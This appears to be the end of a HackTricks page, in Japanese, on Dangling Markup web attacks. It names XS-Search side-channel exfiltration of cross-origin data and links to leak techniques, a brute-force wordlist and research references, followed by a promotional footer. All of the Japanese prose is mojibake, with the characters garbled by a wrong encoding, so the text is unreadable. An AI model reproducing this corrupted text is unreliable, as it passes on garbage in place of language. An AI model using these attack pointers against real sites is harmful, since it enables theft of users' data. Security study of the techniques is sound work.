HTMLã§æ¥ç¶šæ€§ã‚’æ¼æ´©ã•ã›ã‚‹æ–¹æ³•ã¯ã™ã¹ã¦ãŒDangling Markupã«å½¹ç«‹ã¤ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€æ™‚ã«ã¯å½¹ã«ç«‹ã¤ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã¡ã‚‰ã§ç¢ºèªã§ãã¾ã™ï¼š[https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## XS-Search

XS-Searchã¯ã€**ã‚µã‚¤ãƒ‰ãƒãƒ£ãƒãƒ«æ”»æ’ƒ**ã‚’æ‚ªç”¨ã—ã¦**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³æƒ…å ±ã‚’å¤–éƒ¨æµå‡º**ã•ã›ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã¯Dangling Markupã¨ã¯ç•°ãªã‚‹æŠ€è¡“ã§ã™ãŒã€ä¸€éƒ¨ã®æŠ€è¡“ã¯HTMLã‚¿ã‚°ã®å«ã¿ï¼ˆJSã®å®Ÿè¡Œã‚ã‚Šãƒ»ãªã—ï¼‰ã‚’æ‚ªç”¨ã—ã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€[**CSS Injection**](xs-search.md#css-injection)ã‚„[**Lazy Load Images**](xs-search.md#image-lazy-loading)**ãªã©ã§ã™ã€‚**

{% content-ref url="xs-search.md" %}
[xs-search.md](xs-search.md)
{% endcontent-ref %}

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## å‚è€ƒæ–‡çŒ®

ã“ã“ã§ç´¹ä»‹ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®æŠ€è¡“ã¨ãã®ä»–ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã§ç¢ºèªã§ãã¾ã™ï¼š

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ä»–ã®HTMLã‚¿ã‚°ã¯ã€ã“ã¡ã‚‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

è©³ç´°æƒ…å ±ï¼š

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
